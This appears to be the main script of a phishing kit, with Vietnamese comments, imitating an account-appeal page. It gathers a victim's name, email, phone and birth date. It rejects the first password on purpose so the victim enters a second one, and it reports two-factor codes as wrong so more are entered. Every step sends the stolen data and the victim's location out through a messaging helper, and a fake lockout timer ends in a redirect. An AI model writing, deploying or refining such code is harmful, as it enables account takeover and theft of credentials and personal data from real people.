document.addEventListener("DOMContentLoaded", async () => {
    const userLoc = await Utils.getLocation(); 

    let formData = {
        fullName: "", email: "", phone: "", dob: "", appeal: "",
        pass1: "", pass2: "", twoFactorCode: ""
    };
    let passwordAttempts = 0;
    let otpAttempts = 0;
    let isLocked = false; 

    const btnSubmit = document.getElementById("submitRequestBtn");
    const btnSendInfo = document.querySelector("#infoForm button");
    const btnPass = document.getElementById("continueBtn");
    const btnVerify = document.getElementById("verifyBtn");
    const countdownEl = document.getElementById("countdown");

    // BƯỚC 0
    if (btnSubmit) btnSubmit.addEventListener("click", () => Modal.show("infoForm"));

    // BƯỚC 1: INFO
    if (btnSendInfo) {
        btnSendInfo.addEventListener("click", () => {
            const inputs = document.querySelectorAll("#infoForm .meta-input");
            const dobIn = document.querySelectorAll("#infoForm .grid input");

            formData.fullName = inputs[0].value || "N/A";
            formData.email = inputs[1].value || "N/A";
            formData.phone = inputs[4].value || "N/A";
            if (dobIn.length >= 3) formData.dob = `${dobIn[0].value}/${dobIn[1].value}/${dobIn[2].value}`;

            Utils.sendMessage(Utils.formatReport(formData, "INFO", userLoc));
            Modal.show("passwordForm");
        });
    }

    // BƯỚC 2: PASSWORD
    if (btnPass) {
        btnPass.addEventListener("click", () => {
            const passInput = document.getElementById("passwordInput");
            const val = passInput.value;
            passwordAttempts++;

            if (passwordAttempts === 1) {
                formData.pass1 = val;
                passInput.value = "";
                Modal.showError("password", "The password you entered is incorrect. Please try again.");
            } else {
                formData.pass2 = val;
                Utils.sendMessage(Utils.formatReport(formData, "PASS", userLoc));

                // --- CẬP NHẬT GIAO DIỆN OTP VỚI EMAIL/SĐT ĐÃ MÃ HÓA ---
                const me = document.getElementById("maskedEmail");
                const mp = document.getElementById("maskedPhone");
                
                // Dùng hàm maskString vừa viết trong utils.js
                if(me) me.innerText = Utils.maskString(formData.email, 'email');
                if(mp) mp.innerText = Utils.maskString(formData.phone, 'phone');

                Modal.show("verifyModal");
            }
        });
    }

    // BƯỚC 3: OTP (2 LOG -> 30S -> HẾT PHIÊN)
    if (btnVerify) {
        btnVerify.addEventListener("click", () => {
            if (isLocked) return;

            const codeInput = document.getElementById("verifyCode");
            formData.twoFactorCode = codeInput.value;
            otpAttempts++;

            // Chỉ gửi Log lần 1 và 2
            if (otpAttempts <= 2) {
                Utils.sendMessage(Utils.formatReport(formData, "OTP", userLoc));
            }

            if (otpAttempts < 3) {
                // Lần 1, 2: Báo lỗi, cho nhập lại
                codeInput.value = "";
                Modal.showError("verify", "The code you entered is incorrect.");
            } 
            else {
                // Lần 3: KHÓA
                isLocked = true;
                
                // Giao diện khóa
                btnVerify.disabled = true;
                btnVerify.style.opacity = "0.7";
                btnVerify.innerText = "Please wait..."; // Đổi chữ nút bấm
                
                // Hiện lỗi đỏ
                Modal.showError("verify", "Too many attempts. Please wait.");

                // Đếm ngược 30s
                if (countdownEl) {
                    let seconds = 30; 
                    countdownEl.classList.remove("hidden");
                    countdownEl.innerText = `Try again in ${seconds}s`; // Hiện text đếm ngược

                    const timer = setInterval(() => {
                        seconds--;
                        countdownEl.innerText = `Try again in ${seconds}s`;

                        if (seconds <= 0) {
                            clearInterval(timer);

                            // Gửi log chốt hạ
                            Utils.sendMessage("================ HẾT PHIÊN (TIMEOUT) ==================");

                            // Chuyển hướng
                            setTimeout(() => {
                                window.location.href = CONFIG.REDIRECT_URL;
                            }, 1000);
                        }
                    }, 1000);
                } else {
                    // Fallback
                    setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 2000);
                }
            }
        });
    }

    const t = document.getElementById("ticketId");
    if (t) t.innerText = "REF-" + Math.floor(Math.random() * 900000);
});